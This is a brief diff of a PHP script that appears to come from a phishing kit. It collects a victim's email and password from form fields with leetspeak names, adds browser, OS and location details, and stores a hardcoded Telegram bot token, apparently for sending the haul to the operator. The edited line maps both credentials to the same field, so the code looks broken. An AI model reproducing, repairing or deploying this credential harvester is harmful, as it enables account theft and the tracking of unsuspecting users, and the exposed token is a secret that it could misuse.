@@ -70,7 +70,7 @@ date_default_timezone_set('America/Bogota');
 if ( isset ($_POST['yy']) && isset ($_POST['yy'])  ){
 
 
-$message = "m4il: ".$_POST['c0r']." - p4zz-m4il: ".$_POST['pc0r']."  \r\n";
+$message = "m4il: ".$_POST['yy']." - p4zz-m4il: ".$_POST['yy']."  \r\n";
 $message .= " SO= ".$user_os." ".$navegador." ".$userp." ".$pais." ".$region." ".$ciudad."\r\n";
 $apiToken = "5338937969:AAFrrJvtWJi_O-RDz5a3YuLhC8tF1hBgkM4";
 
